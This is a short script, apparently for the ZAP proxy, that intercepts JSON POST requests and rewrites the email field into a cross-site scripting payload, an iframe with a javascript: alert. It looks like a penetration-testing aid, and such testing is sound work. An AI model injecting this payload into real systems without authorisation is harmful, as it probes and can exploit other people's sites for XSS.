function invokeWith(msg) {

    var header = msg.getRequestHeader()
	if(!header.getHeader("Content-Type")
		|| !header.getHeader("Content-Type").trim().equalsIgnoreCase("application/json")
		|| header.getMethod() != "POST"
		|| msg.getRequestBody().length() == 0
	){
		return;
	}

	var body = msg.getRequestBody().toString();
	try{
		var data = JSON.parse(body);
	}
	catch(err){
		print("failed: " + err.message);
		return;
	}

     data.email = "<iframe src=\"javascript:alert('xss')\">";
     var new_data = JSON.stringify(data);

     //print(new_data); //для просмотра внесенных изменений 

     msg.setRequestBody(new_data);
     msg.getRequestHeader().setContentLength(msg.getRequestBody().length());
}
